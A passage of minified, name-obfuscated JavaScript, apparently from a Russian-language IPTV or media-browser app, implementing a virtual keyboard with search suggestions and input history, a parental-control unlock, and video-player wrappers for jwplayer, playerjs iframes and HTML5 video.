break}},render:function(){if($_("keyboard")){var html='';for(i in VK.l0IlI0I10LMNlOI1IYpr){for(j in VK.l0IlI0I10LMNlOI1IYpr[i]){if(VK.l0IlI0I10LMNlOI1IYpr[i][j].length==1)var vshift=0;else vshift=VK.shift;var but=VK.l0IlI0I10LMNlOI1IYpr[i][j][vshift];if(but.indexOf("_ST_")==0||but.indexOf("http")==0)var pbut="<img src='"+_img(but)+"'>";else pbut=but;if(but.indexOf("international.png")>0)var cl="green";else if(but.indexOf("backspace.png")>0)cl="#ce0d0d";else if(but.indexOf("enter.png")>0)cl="blue";else if(but.indexOf("clear.png")>0)cl="#e9d737";else cl="";if(cl!="")pbut="<span style='border-radius:2px;position: absolute;padding: 5px; margin: 39px 3%;background: "+cl+";'></span>"+pbut;html+="<div onmousemove=\"VK.set(["+i+","+j+",-1]);\" "+"onclick=\"VK.enter('"+but+"');\" id='kb"+i+""+j+"' style='margin:1px;padding: 0.1% 0%; border-radius:6px;float:left;font-size: 170%;width:6%;height:22%;overflow:hidden;'>"+pbut+"</div>"}
html+="<br clear='both' />"}
$_("keyboard",html);VK.setpos()}},arLast:function(str){var c=this;var s=[];for(var i in enteresObj){if(String(enteresObj[i].n).indexOf(str)==0)s.push({"q":enteresObj[i].n,"type":"last","img":"_ST_history.png","id":i,"source":"История"});if(str==""&&s.length>10&&c.presearch)break}
if(str!=""&&c.presearch){for(var i in lOO1IIlwlIl0l1lYpr){if(String(lOO1IIlwlIl0l1lYpr[i].title).indexOf(str)==0){s.push({"q":lOO1IIlwlIl0l1lYpr[i].title,"xml_url":lOO1IIlwlIl0l1lYpr[i].xml_url,"type":"history","img":lOO1IIlwlIl0l1lYpr[i].icon,"source":"История"})}}}
return s},clearQuick:function(){var c=this;if(c.getvalue!==""&&c.qSelect==-1)c.setvalue("");else if(c.qSelect==-1)c.delQuick("page");else c.delQuick(gV(c.quicks[c.qSelect],"id"));c.quickGet(c.getvalue())},delQuick:function(id){var c=this;if(id=="page"){var nx=0;for(var i in c.quicks){if(gV(c.quicks[i],"id")!=""){enteresObj.splice(c.quicks[i].id-nx,1);nx++}}
kjtYpr.inf("Удалено "+nx+" значений с истории вводов",1500)}else if(id!=""){enteresObj.splice(id,1);kjtYpr.inf("Удалено 1 элемент с истории вводов",1500)}else kjtYpr.inf("Удалить можно только значение с вашей истории вводов!",1500);maJor.write("enteres",ll1lI1lI0sl0OlIYpr(enteresObj))},quickList:function(n){var c=this;if($_("presearch")){if(n!=null)c.qSelect=n;if(c.qSelect<-1)c.qSelect=c.quicks.length-1;if(c.qSelect>c.quicks.length-1)c.qSelect=-1;if(c.qSelect==-1){$_("presearch").style.borderColor="transparent";$_(c.id).style.border="2px solid #65D0E4"}else{$_("presearch").style.borderColor="#65D0E4";$_(c.id).style.border="2px solid transparent"}
for(var i=0;i<c.quicks.length;i++){$_("llO0I111lvwajllII11Ypr"+i).style.backgroundColor=((gV(c.quicks[i],"type")=="se"&&(c.qSelect==-1||c.qSelect==i))?"#465057":"");$_("llO0I111lvwajllII11Ypr"+i).style.color=(i==c.qSelect?"orange":"white")}}},quickParse:function(list,data,sourc){var c=this;maJor.each(data,function(w){if(w.q){w.source=(w.source||sourc);w.type=(w.type||"text");list.push(w)}else if(typeof w=="string")list.push({"q":gV(w),"type":"text","source":sourc})});return list},quickRender:function(list,reqid,load){var c=this,max=16;if(reqid==c.req_id){c.quicks=[];$_("presearch","");$_("MenuCh","");var llO0I111lvwajllII11Ypr="",ex=";",dop="",qtypes={},hmenu=Math.floor(c.pheight/max);if(c.str==""){list=_.filter(list,function(v){return!is_xxx(gV(v,"q"))})}
if(_.size(list)>max){maJor.each(list,function(w){if(qtypes[w.type])qtypes[w.type]++;else qtypes[w.type]=1});var r=_.size(list)-max;var rr=Math.floor(r/_.size(qtypes))
var razn=r-rr*_.size(qtypes);var nd=0;var last;maJor.each(_(qtypes).chain().pairs().sortBy(_.last).value(),function(w){last=w[0];qtypes[last]-=rr-nd;nd=0;if(qtypes[last]<1){qtypes[last]=1;nd=1}});qtypes[last]-=razn}
nd=0;maJor.each(list,function(w){if(w.q){w.q=w.q.replace(/<.*?>/g,"");if(ex.indexOf(";"+w.q+gV(w,"type")+";")==-1){if(typeof qtypes[w.type]!="undefined"){if(qtypes[w.type]){qtypes[w.type]--}else if(nd)nd--;else return}
if(c.quicks.length<max){llO0I111lvwajllII11Ypr+="<div id='llO0I111lvwajllII11Ypr"+c.quicks.length+"' style='width: 100%;height:"+hmenu+"px;white-space: nowrap;overflow:hidden;font-size:85%;' onclick=\"VK.enter('Enter');\" onmousemove=\"VK.quickList("+c.quicks.length+");\" onclick=\"VK.enter('Enter');\">";if(gV(w,"img")!="")llO0I111lvwajllII11Ypr+='<img onerror="onImgError(this)" src="'+_img(w.img)+'" style="float:left;width:'+Math.ceil((hmenu-2)*1.5)+'px;height:'+(hmenu-2)+'px;padding-top:2px;padding-right:3px;">';if(gV(w,"source"))llO0I111lvwajllII11Ypr+="<div style='float:right;color:gray;overflow:hidden;font-size:90%;margin-top:0px;'>"+gV(w,"source")+"</div>";llO0I111lvwajllII11Ypr+="<div style='font-size:80%;width: auto;overflow:hidden;margin-top: 0px;padding:0px 3px;'>"+w.q;llO0I111lvwajllII11Ypr+="</div></div>";ex+=w.q+gV(w,"type")+";";c.quicks.push(w)}}else nd++}});if(load&&c.quicks.length<12)llO0I111lvwajllII11Ypr+="<div style=''><center><img src='"+_img("_ST_b_loading.gif")+"' width=25 /></center></div>";$_("presearch","<div onmouseout=\"VK.quickList(-1);\" id='PreSearch' style='background-color:#323c42;border:2px solid transparent;padding:0px 3px;'>"+llO0I111lvwajllII11Ypr+"</div>");c.quickList()}},quickGet:function(str){var c=this;try{var load=0;c.str=str=parseHtmlEnteties(str||"");c.req_id++;var reqid=c.req_id;$('#'+c.id).get(0).scrollLeft=$('#'+VK.id).get(0).scrollWidth;VK.qSelect=-1;var list=c.arLast(str);if(c.presearch){var u=sU(c.presearch,"client=3&presearch="+str);if(str=="")var sso="Топ запросов";else sso="";var hico=30;if(gV(c.pq.el,"playlist_url")=="searchEngines"){if($_("icoedit")==null)$_("icosearch",'<img id="icoedit" align="left" style="    margin: 1px 3px;width:'+hico+'px;height:'+hico+'px;" onerror="onImgError(this,\'ico_edit\');" src="'+_img(getDefaultSE()["logo"])+'" >');if(str!=""){var xd=getDefaultSE();if(str.match(/^(http|www\.|html:\/\/)/)){list.unshift({"q":str,"type":"se","img":_img("_ST_urls.png"),"source":' - _FPOpen link_'});$_("icosearch",'<img align="left" style="width:42px;height:36px;position:absolute;" src="'+_img("_ST_urls.png")+'" >')}else list.unshift({"q":str,"type":"se","img":_img(xd.logo),"source":' - '+"_FPSearch_ _FPin_ "+xd.title})}}else if($_("icoedit")==null)$_("icosearch",'<img id="icoedit" align="left" onerror="this.src=\''+ico_edit+'\';" style="width:'+hico+'px;height:'+hico+'px;position:absolute;" src="'+gV(curPage.curCh,"logo_30x30")+'" >');if(!c.hS[u]){load=1;uHelper.create("directnoheader").getI(u).parse=function(s){try{data=l0OIIlIIlONuu1111Ypr(gV(s));if(data!=null){c.hS[u]=data;list=c.quickParse(list,c.hS[u],sso)}
c.quickRender(list,reqid)}catch(e){kjtYpr.popUp('Err quick format [{q:"text"},...]<br>'+e.message,2500)}}}else list=c.quickParse(list,c.hS[u],sso)}
c.quickRender(list,reqid,load)}catch(e){kjtYpr.popUp("Err quick data "+e.message,1200)}},addSystem:function(){var c=this;c.focus.focus();if(c.getvalue()!=="")setCaretPosition(c.getvalue().length);VK.focus.addEventListener("keydown",function(event){var key=event.keyCode||event.keycode||event.which;if(key==VK_LEFT||key==VK_RIGHT){if(VK.qSelect!=-1)c.complete(c.getvalue())}else if(key==VK_BACK||key==27||(key==8&&c.getvalue()==="")){setTimeout("VK.close(1);	",100)}else if(key==VK_DOWN||key==VK_UP){event.preventDefault();if(key==VK_DOWN)c.qSelect++;else c.qSelect--;c.quickList()}else if(key===13){if(maJor.build>=7||1){event.preventDefault();setTimeout(function(){c.complete(c.getvalue())},150)}}});c.focus.oninput=function(){if(1){if(VK.qSelect!=-1)c.complete(c.getvalue());c.quickList(-1);c.quickGet(c.getvalue())}}},open:function(pq){try{var c=this;c.quicks=[];if(!pq.el)pq.el=curCh();c.select=getSelect();c.pq=pq;c.type=c.pq.type||gV(c.pq.el,"type")||"";c.title=c.pq.title||gV(c.pq.el,"title")||"";c.search_on=c.pq.search_on||gV(c.pq.el,"search_on");if(c.search_on=="search_on"||c.search_on=="")c.search_on="_FPVvediteText_";c.inputId=c.pq.inputId||gV(c.pq.el,"inputId")||"";if(gV(c.pq.el,"presearch").indexOf("http")!=0){if(typeof c.pq.el.search=="object"||c.title.match(/(ошук|arch|оиск|poisk|искат|find|найти|)/i))
c.pq.el.presearch="http://omnibox.spiderxml.com/?type=auto"}
if(gV(c.pq.el,"presearch").indexOf("http")==0)c.presearch=gV(c.pq.el,"presearch");else c.presearch=null;$_("vk").style.width=(maJor.screen().w-150)+"px";$_("vk").style.fontSize=(0.0347*maJor.screen().h).toFixed(0)+'px';if(c.l0IlI0I10LMNlOI1IYpr==null){if(gV(c.pq.el,"playlist_url")=="cmdEnterlist")c.l0IlI0I10LMNlOI1IYpr=VK.US;else c.l0IlI0I10LMNlOI1IYpr=c.Kir}
var gtitle="";if(c.type!="omnibox"){if($_("ch"+c.select))$_("ch"+c.select).style.visibility="hidden";gtitle="<div style='background-color: #323c42;white-space: nowrap;'>"+c.search_on+(c.title!=""?" ("+(c.pq.el.search_title||c.title).replace(/<.*?>/g,"")+")":"")+"</div>"}
var hvk=Math.ceil(((100/maJor.params.get("zoom"))*0.95*0.65*maJor.screen().h)-35);var html='<div style="font-size:'+(10000/maJor.params.get("zoom")).toFixed(0)+'%'+';height: '+hvk+'px;margin-top:35px;margin-left: 2px;border-radius:8px;width:97.3%;text-align: left;overflow:hidden;zoom:'+maJor.params.get("zoom")+'%;">'+gtitle+'<div style="margin: 0px; background-color: #eeeeee;width:auto;text-align: left;">'+'<span id="icosearch" style="float:right;height:36px;width:36px;"></span><div style="overflow: hidden;">';if(maJor.params.get("keyboard")=="system")html+='<form onsubmit="VK.onkeyb(this); return false;"><input id="search" type="text" style="height:32px;padding: 0px;width: 98%; border: 2px solid rgb(101, 208, 228);font-size: 25px;"></form>';else html+='<div id="search" style="font-family: tahoma;overflow: hidden;white-space: nowrap;color: black;height:32px;padding-top: 3px;width: 98%; border: 2px solid rgb(101, 208, 228);font-size: 24px;" onclick="VK.setSelectAll(0);"><span id="textsearch"></span><span id="canim" style="display:none;animation: blink 0.7s infinite;font-size: 24px;">|</span></div>';c.pheight=hvk-36;html+='</div></div><div id="presearch" style="height:'+c.pheight+'px;overflow:hidden;"></div> </div>';if(maJor.params.get("keyboard")!="system")html+='<div id="keyboard" style="height: '+Math.ceil(0.95*0.35*(maJor.screen().h-35))+'px;position: absolute; width: 100%;bottom:0px;"></div>';$_("vk",html);$_("vk").style.display="block";c.id="search";c.focus=$_(c.id);c.setvalue(c.pq.value||gV(c.pq.el,"value"));handler="vk";if(c.type=="password"){c.presearch=null;c.focus.type=c.type}
c.quickGet(gV(c.pq.el,"value"));if(maJor.params.get("keyboard")=="system")c.addSystem();else c.render();c.setSelectAll(1);c.setCaretPosition()}catch(e){kjtYpr.popUp("Err keyboard "+e.message)}},onkeyb:function(t){if(maJor.params.get("keyboard")=="system")setTimeout("VK.complete(VK.getvalue())",150)},insert:function(word){var c=this;var val=c.getvalue();if(c.isSelAll)c.setvalue(word=="-rem-"?"":word);else if(typeof c.focus.selectionStart!="undefined"){var start=c.focus.selectionStart;if(start<0)start=0;else if(start>c.getvalue().length)start=c.getvalue().length;if(word=="-rem-")c.setvalue(val.substring(0,start-1)+val.substring(c.focus.selectionStart,val.length));else c.setvalue(val.substring(0,start)+word+val.substring(c.focus.selectionStart,val.length));if(word=="-rem-")c.setCaretPosition(start-1);else c.setCaretPosition(start+word.length)}else{if(word=="-rem-")c.setvalue(val.substring(0,val.length-1));else c.setvalue(val+word)}},getvalue:function(){if(maJor.params.get("keyboard")=="system")return VK.focus.value;else return $_("textsearch").innerHTML},setvalue:function(s){var c=this;if(maJor.params.get("keyboard")=="system")VK.focus.value=s;else{$_("textsearch",s);if(c.isSelAll)c.setSelectAll(0)}},setSelectAll:function(m){var c=this;if(c.getvalue()===""&&m)m=0;$_("textsearch").style.backgroundColor=(m?"#6fb3fb":"");c.isSelAll=m},setCaretPosition:function(pos,m){var c=this;if(m){if(typeof c.focus.selectionStart=="undefined")c.focus.selectionStart=c.getvalue().length;c.focus.selectionStart+=m;if(c.focus.selectionStart<0)c.focus.selectionStart=0;else if(c.focus.selectionStart>c.getvalue().length)c.focus.selectionStart=c.getvalue().length;if(c.isSelAll)c.setSelectAll(0)}else if(pos!=null)c.focus.selectionStart=pos;if(!c.isSelAll){$_("canim").style.display="inline";$_("canim").style.marginLeft=((c.getvalue().length-c.focus.selectionStart)*-17)+"px"}else $_("canim").style.display="none"},enter:function(str){var c=this;str=String(str);if(str.length==1){if(maJor.params.get("keyboard")=="system"){return}
c.insert(str);if(VK.shift==1){VK.shift=0;VK.render()}
c.quickGet(c.getvalue())}else{if(str.indexOf("return.png")>0)str="Close";else if(str.indexOf("clear.png")>0){c.clearQuick();return}else if(str.indexOf("copy.png")>0){VK.copy=c.getvalue();copyToClipboard(VK.id);return}else if(str.indexOf("paste.png")>0){var text="";if(maJor.build>=7)text=andr.exec('{"type":"clipboard","mode":"get"}');else if(window.clipboardData)text=window.clipboardData.getData("Text");else if(event.originalEvent&&event.originalEvent.clipboardData)text=event.originalEvent.clipboardData.getData("Text");if(text!="")VK.insert(text);else VK.insert(gV(VK.copy));return}else if(str.indexOf("left.png")>0){c.setCaretPosition(null,-1);return}else if(str.indexOf("right.png")>0){c.setCaretPosition(null,1);return}
switch(str){case "_ST_shift.png":VK.shift=(VK.shift==0)?1:0;VK.render();break;case "_ST_backspace.png":if(c.getvalue().length>0){VK.insert("-rem-")}
c.quickGet(c.getvalue());break;case "_ST_space.png":VK.insert(" ");break;case "_ST_international.png":if(VK.l0IlI0I10LMNlOI1IYpr[1][0][0]=="q")VK.l0IlI0I10LMNlOI1IYpr=VK.Kir;else VK.l0IlI0I10LMNlOI1IYpr=VK.US;VK.render();break;case "_ST_enter.png":c.complete(c.getvalue());break;case "Shift":VK.shift=(VK.shift==0)?1:0;VK.render();break;case "CLEAR":c.setvalue("")
break;case "Close":VK.close();break;case "Eng":VK.l0IlI0I10LMNlOI1IYpr=VK.US;VK.render();break;case "Rus":VK.l0IlI0I10LMNlOI1IYpr=VK.Kir;VK.render();break;case "Enter":c.complete(c.getvalue());break;default:c.insert(str);break}}
if(c.inputId=="unlockpass"){c.str=c.getvalue();if(maJor.params.get('passwordkey')==c.str){kjtYpr.Password=c.str;c.close();IlO11lQ0().navigate(c.pq.el);if(kjtYpr.Password=="0000")kjtYpr.popUp("_FPViNeSmeniliPassRodKontrRekomendSm_</i>");else kjtYpr.popUp("<i>_FPParolDeistDk_</i>")}}},set:function(o){VK.pos=[o[0],o[1]];VK.quickList(o[2]);VK.setpos()},setpos:function(m){var c=this;if(VK.last[0]==4){VK.pos[1]=VK.last2[1]}
if(VK.pos[0]<0)VK.pos[0]=VK.l0IlI0I10LMNlOI1IYpr.length-1;if(VK.pos[1]<0)VK.pos[1]=VK.l0IlI0I10LMNlOI1IYpr[VK.pos[0]].length-1;if(VK.pos[0]>VK.l0IlI0I10LMNlOI1IYpr.length-1){VK.pos[0]=0}
if(VK.pos[1]>VK.l0IlI0I10LMNlOI1IYpr[VK.pos[0]].length-1){if(m)VK.pos[1]=VK.l0IlI0I10LMNlOI1IYpr[VK.pos[0]].length-1;else VK.pos[1]=0}
for(var i in VK.l0IlI0I10LMNlOI1IYpr){for(var j in VK.l0IlI0I10LMNlOI1IYpr[i]){if(i==VK.pos[0]&&j==VK.pos[1]&&VK.qSelect==-1){$_("kb"+i+""+j).style.backgroundColor="#2478D0";$_("kb"+i+""+j).style.color="orange"}else{$_("kb"+i+""+j).style.color=maJor.params.get("color");$_("kb"+i+""+j).style.backgroundColor="#323c42"}}}
VK.last2[0]=VK.last[0];VK.last2[1]=VK.last[1];VK.last[0]=VK.pos[0];VK.last[1]=VK.pos[1]},saveQuickEnteres:function(s){var c=this;if(IlO11lQ0("is_private")||c.type=="password"||c.title.match(/(пароль|password)/i))return;if(s.match(/^http/))var type="url";else if(c.presearch)type="web";else type="";var tmp=null,md=md5(gV(c.pq.el,"search_on")).substr(0,10);for(var i in enteresObj){if(enteresObj[i].n==s){tmp=enteresObj.splice(i,1)[0];tmp.s=md;enteresObj.unshift(tmp);break}}
if(tmp==null){tmp={"n":s,"s":md};if(type!="")tmp.t=type;enteresObj.unshift(tmp)}
if(enteresObj.length>300)enteresObj.splice(300,1)
maJor.write("enteres",ll1lI1lI0sl0OlIYpr(enteresObj))},complete:function(str){var c=this;try{$_("presearch","");if(c.qSelect==-1){if(c.select>=0&&$_("ch"+c.select)){$_("ch"+c.select).style.visibility="visible";if(str!=""&&c.presearch)$_("titleid"+c.select,str)}
c.saveQuickEnteres(str);if(c.pq.oncomplete){try{if(c.pq.oncomplete(c))c.close()}catch(e){kjtYpr.popUp("Err oncomplete: "+e.message);c.close()}}else{kjtYpr.lQIO1I0lWwC01OOlIYpr=str;IlO11lQ0().navigate(c.pq.el,null,null,{"text":str})}}else{var q=c.quicks[c.qSelect];c.qSelect=-1;if(gV(q,"type")=="se")c.complete(str);else if(gV(q,"xml_url")!=""){c.close();OpenUrl({"title":q.q,"playlist_url":q.xml_url,"logo_30x30":gV(q,"img")})}else{c.pq.el.type_quicksearch=gV(q,"type");c.setvalue(q.q);c.qSelect=-1;if(maJor.params.get("keyboard")=="system"){c.focus.blur();c.focus.focus()}else{if(c.getvalue().indexOf("http")==0&&c.l0IlI0I10LMNlOI1IYpr[1][0][0]!="q")c.enter("Eng");VK.pos[0]=2;VK.pos[1]=13;VK.setpos()}
if(c.presearch)c.quickGet(c.getvalue());c.quickList()}}}catch(e){kjtYpr.popUp("Err complete: "+e.message)}},close:function(m){var c=this;$_("vk").style.display="none";$_("player").style.display="none";$_("main").style.display="block";handler="menu";if(m==null){IlO11lQ0().loadPage=null;if(getSelect()>=0&&$_("ch"+getSelect())){$_("ch"+getSelect()).style.visibility="visible";if(c.getvalue()!=="")IlO11lQ0().curCh()["value"]=c.getvalue()}}
$_("vk","")}};vPlayer={glSec:0,curTime:-1,totalTime:0,PLINDEX:-1,iptv_retry:0,stopped:!0,timeoutWork:null,setidprop:function(id,n){if(n==0){$_(id).style.top="0px";$_(id).style.left="0px";$_("subtitle").style.width="90%";$_("subtitle").style.top="80%";$_("subtitle").style.fontSize="40px";$_("subtitle").style.left="5%";$_(id).style.width=maJor.screen().w+"px";$_(id).style.height=maJor.screen().h+"px"}else{$_(id).style.top="63%";$_(id).style.left="67%";$_(id).style.width="32%";$_(id).style.height="37%"}},jw:{name:"jw",optScreenN:["_FPOriginal_","_FPRastyanut_","Fill","None"],optScreenV:["uniform","exactfit","fill","none"],exis:function(){return window.jwplayer},fullscreen:function(){if($_("jw").requestFullScreen)$_("jw").requestFullScreen();else if($_("jw").mozRequestFullScreen)$_("jw").mozRequestFullScreen();else if($_("jw").webkitRequestFullScreen)$_("jw").webkitRequestFullScreen();$_("jw").style.width="100%";$_("jw").style.height="100%"},pause:function(){jwplayer("jw").pause()},volume:function(x){if(x!=null)jwplayer("jw").setVolume(x);return(jwplayer("jw").getVolume()||100)},setMini:function(){var c=vPlayer;if(c.is_mini())c.setidprop("jw","mini");else c.setidprop("jw",0)},quality:function(set){var quals=jwplayer("jw").getQualityLevels();if(quals&&quals.length){if(set!=null){if(set>=quals.length)set=0;else if(set<0)set=quals.length-1;jwplayer("jw").setCurrentQuality(set);this.qualCur=set}else this.qualCur=jwplayer("jw").getCurrentQuality()||0;return{count:quals.length,name:(quals[this.qualCur]&&quals[this.qualCur].label||""),sel:this.qualCur}}else{this.qualCur=this.qualName=0;return}},audioTracks:function(set){var tracks=jwplayer("jw").getAudioTracks();if(tracks&&tracks.length){if(set!=null){if(set>=tracks.length)set=0;else if(set<0)set=tracks.length-1;jwplayer("jw").setCurrentAudioTrack(set);this.audioCur=set}else this.audioCur=jwplayer("jw").getCurrentAudioTrack()||0;this.audioName=jwplayer("jw").getAudioTracks()[this.audioCur].name||"Default";return{count:tracks.length,name:this.audioName,sel:this.audioCur}}else{this.audioCur=this.audioName=0;return}},getInfo:function(){var html="";if(jwplayer("jw").getVisualQuality()&&jwplayer("jw").getVisualQuality().level&&jwplayer("jw").getVisualQuality().level.width)html+=jwplayer("jw").getVisualQuality().level.width+"x"+jwplayer("jw").getVisualQuality().level.height;else if($_("jwvideo")){if($_("jwvideo").videoWidth)html+=$_("jwvideo").videoWidth+"x"+$_("jwvideo").videoHeight}
html+=" "+this.optScreenN[maJor.params.get("xmode")];html+=" "+jwplayer("jw").getProvider().name;if(jwplayer("jw").getQualityLevels().length>1){var bitrate=jwplayer("jw").getQualityLevels()[jwplayer("jw").getCurrentQuality()].bitrate;var quality=jwplayer("jw").getCurrentQuality();if(quality==0)quality="Auto";html+=" Качество: ";if(!isNaN(bitrate))html+=Math.ceil(bitrate/1000)+"kbps";html+=" ["+quality+"/"+(jwplayer("jw").getQualityLevels().length-1)+"]"}
if(jwplayer("jw").getAudioTracks().length>1){var curA=jwplayer("jw").getCurrentAudioTrack();if(curA==0)curA="Auto";html+=" Аудио: "+jwplayer("jw").getAudioTracks()[jwplayer("jw").getCurrentAudioTrack()].name+" ["+curA+"/"+jwplayer("jw").getAudioTracks().length+"]"}
if(jwplayer("jw").getPlaybackRate()!=1)html+=" Rate: "+jwplayer("jw").getPlaybackRate()+"x";return html},setSize:function(){if(maJor.params.get('xmode')>3)maJor.params.set('xmode',0);else if(maJor.params.get('xmode')<0)maJor.params.set('xmode',3);jwplayer().setConfig({"stretching":this.optScreenV[maJor.params.get("xmode")]})},start:function(url,start,jwtype){var c=vPlayer,m=this;this.prate=null;$_("video").style.display="none";$_("jw").style.display="block";jwplayer.key="HY8B2VALIOA/I+mqBXK+3/Jz9OQkc+4GJMvoKWJoV8GFT9Dr";if(!jwtype)jwtype=(is_m3u8(url)==2?"m3u8":"m4v");l10I11l10duklS11llOYpr("jws:"+jwtype);function getJWtype(){if(typeof curPage.global.allvast=="object")return null;else return jwtype}
jwplayer("jw").setup({"file":url,"height":"100%","width":"100%","type":getJWtype(),"autostart":!0,"androidhls":maJor.build>=7?true:!1,"hlsjsdefault":(jwtype=="mp4"?false:!0),"stretching":this.optScreenV[maJor.params.get("xmode")],"advertising":(gP().global.allvast||{})});jwplayer("jw").on("ready",function(event){m.setMini()});jwplayer().on('firstFrame',function(){c.OnBufferingComplete();if(start)this.seek(start)});jwplayer("jw").on("adBreakEnd",function(event){});jwplayer("jw").on('complete',function(){c.endvideo()});jwplayer("jw").on('time',function(){c.getVideoPlayInfo()});jwplayer("jw").on("error",c.eventerrvideo);jwplayer("jw").on("setupError",function(event){if(event.message=="No playable sources found"&&jwtype!="mp4"){c.player().start(url,start,"mp4")}else c.eventerrvideo(event)});jwplayer("jw").on("all",function(event){});this.pause();this.play()},stop:function(){jwplayer("jw").stop()},exit:function(){$_("jw").style.display="none"},play:function(){jwplayer("jw").play()},seek:function(sec){jwplayer("jw").seek(sec)},getRate:function(){return(this.prate||jwplayer("jw").getPlaybackRate()||1)},rate:function(rate){jwplayer("jw").setPlaybackRate(rate);this.prate=rate},getPosition:function(){return jwplayer("jw").getPosition()},getTotal:function(){return jwplayer("jw").getDuration()}},playerjs:{name:"playerjs",exis:function(){return 1},fullscreen:function(){$_("playerjs").contentWindow.postMessage({"api":"fullscreen"},"*");$_("playerjs").style.width="100%";$_("playerjs").style.height="100%"},volume:function(x){if(x!=null){this.setVol=x;$_("playerjs").contentWindow.postMessage({"api":"volume","set":(x/100).toFixed(2)},"*")}
return(this.setVol||100)},play:function(){$_("jw").style.zIndex="0";$_("playerjs").contentWindow.postMessage({"api":"play"},"*")},pause:function(){$_("playerjs").contentWindow.postMessage({"api":"pause"},"*")},start:function(url,start){var c=vPlayer;this.setVol=this.setVol||100;$_("video").style.display="none";$_("jw").style.display="block";if(gV(c.playElement,"type")=="iframe"){$_("jw",'<iframe id="playerjs2" style="z-index:2;height:100%;width:100%;margin:0px; padding:0px;" allow="autoplay" sandbox="allow-scripts allow-same-origin" frameborder="0" '+'src=\'javascript:d=document;d.clear();\'></iframe>');setTimeout(function(){$_("playerjs2").src="javascript:d=document;d.clear();d.open();"+"d.write(\"<!DOCTYPE html><html>"+"<body style=\\\"width:"+maJor.screen().w+"px;height:"+maJor.screen().h+"px;overflow: hidden;\\\">"+"<script>"+"var $=parent.$;"+"function jwonload(){parent.$_(\\\"jw\\\").style.zIndex=\\\"2\\\";setTimeout(\\\"parent.vPlayer.player().play();\\\",5500);parent.statusbar(\\\"off\\\");}"+"</script>"+"<iframe onload=\\\"jwonload();\\\" allow=\\\"autoplay\\\" sandbox=\\\"allow-scripts allow-same-origin\\\" style=\\\"width:100%;height:100%;margin: 0px; border:none;\\\" id=\\\"playerjs\\\" src=\\\""+url.replace("#playerjs","")+"\\\" />"+"</body>"+"</html>\");d.close();"},150)}else $_("jw","<iframe allow='autoplay' onload='$_(\"jw\").style.zIndex=\"2\";setTimeout(\"vPlayer.player().play();\",9500); ' style='width:100%;height:100%;margin-top: 0px; border:none;' id='playerjs' src='"+url.replace("#playerjs","")+"' />")},stop:function(){$_("jw","")},exit:function(){$_("jw").style.zIndex="0";$_("jw").style.display="none"},getPosition:function(){return vPlayer.curTime||0},getTotal:function(){return vPlayer.totalTime||0},message:function(event){var c=vPlayer;if(event.data.event=="inited"){$_("jw").style.zIndex="2";this.play()}else if(event.data.event=="resumed"){c.paused=!1}else if(event.data.event=="paused"){c.paused=!0}else if(event.data.event=="ended"){c.endvideo()}else if(event.data.event=="time"){c.curTime=Math.ceil(event.data.data);c.totalTime=Math.ceil(event.data.duration);if(c.curTime>3)$_("jw").style.zIndex="0";else $_("jw").style.zIndex="2";if(c.totalTime)c.getVideoPlayInfo(c.curTime,c.totalTime)}else if(event.data){if(typeof event.data.duration!="undefined")vPlayer.totalTime=Math.ceil(event.data.duration);if(typeof event.data.played!="undefined")vPlayer.curTime=Math.ceil(event.data.played);if(c.curTime>3)$_("jw").style.zIndex="0";else $_("jw").style.zIndex="2";c.getVideoPlayInfo(c.curTime,c.totalTime)}},seek:function(n){$_("playerjs").contentWindow.postMessage({"api":"seek","set":n},"*")}},download:{name:"download",exis:function(){return 1},stop:function(){},exit:function(){},start:function(url){document.location=url}},html5:{name:"html5",exis:function(){return 1},volume:function(x){if(x!=null)video.volume=(x/100).toFixed(2);return Math.ceil(video.volume*100)},fullscreen:function(){if(video.requestFullScreen)video.requestFullScreen();else if(video.mozRequestFullScreen)video.mozRequestFullScreen();else if(video.webkitRequestFullScreen)video.webkitRequestFullScreen();$_("video").style.width="100%";$_("video").style.height="100%"},pause:function(){video.pause()},pName:["AUTO","FULL","16/9","4/3","MANUAL"],getInfo:function(){var c=vPlayer;var text=(video.videoWidth?video.videoWidth+"x"+video.videoHeight:"")+" _FPProporcii_: "+this.pName[maJor.params.get('xmode')];if(maJor.params.get('xmode')==4)text+=" "+maJor.params.get("Pw")+"x"+maJor.params.get("Ph");if(this.getRate!=1)text+=" Rate: "+this.getRate+"x";return text},audioTracks:function(set){var tracks=video.audioTracks;if(tracks&&tracks.length){if(set!=null){if(set>=tracks.length)set=0;else if(set<0)set=tracks.length-1;for(var i=0;i<video.audioTracks.length;i++){if(i==set)video.audioTracks[i].enabled=!0;else video.audioTracks[i].enabled=!1}
this.audioCur=set}
this.audioName=video.audioTracks[this.audioCur].language||video.audioTracks[this.audioCur].label||"";return{count:tracks.length,name:this.audioName,sel:this.audioCur}}else{this.audioCur=this.audioName=0;return}},setSize:function(n){var c=vPlayer;if(c.is_mini())return;n=n||maJor.params.get('xmode');if(n<0)n=4;else if(n>4)n=0;maJor.params.set('xmode',n);var xWidth=0;var videoRatio=video.videoWidth/video.videoHeight,tagRatio=16/9;if(n==4){maJor.params.set('Pw',parseFloat(maJor.params.get('Pw')));maJor.params.set('Ph',parseFloat(maJor.params.get('Ph')));if(maJor.params.get('Pw')<200)maJor.params.set('Pw',1280);if(maJor.params.get('Ph')<200)maJor.params.set('Ph',720);tagRatio=parseInt(maJor.params.get("Pw"))/parseInt(maJor.params.get("Ph"));video.style.top="0px";video.style.left="0px";video.style.width=maJor.params.get("Pw")+"px";video.style.height=maJor.params.get("Ph")+"px";if(videoRatio<tagRatio){video.style.WebkitTransform="scaleX("+tagRatio/videoRatio+")"}else{video.style.WebkitTransform="scaleY("+videoRatio/tagRatio+")"}}else if(n==1){if(videoRatio>=tagRatio-0.02){video.style.width=window.innerWidth+"px";video.style.height=window.innerHeight+"px";video.style.top="0px";video.style.left="0px";video.style.WebkitTransform="scaleY(1)"}else{video.style.width=window.innerWidth+16+"px";video.style.height=window.innerHeight+9+"px";video.style.top="-6px";video.style.left="-8px";tagRatio=4/3;if(videoRatio<tagRatio)video.style.WebkitTransform="scaleX("+tagRatio/videoRatio+")";else video.style.WebkitTransform="scaleY("+videoRatio/tagRatio+")"}}else if(n==2){if(videoRatio<tagRatio){video.style.WebkitTransform="scaleX("+tagRatio/videoRatio+")"}else{video.style.WebkitTransform="scaleY("+videoRatio/tagRatio+")"}
